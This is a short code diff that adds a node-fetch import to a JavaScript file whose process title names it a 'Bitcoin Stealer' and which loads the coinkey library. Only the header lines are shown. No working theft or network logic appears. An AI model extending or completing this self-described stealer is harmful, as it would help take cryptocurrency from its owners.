@@ -1,5 +1,7 @@
 "use strict";
 
+import fetch from "node-fetch";
+
 process.title = "Bitcoin Stealer by Michal2SAB";
 
 const CoinKey = require('coinkey');
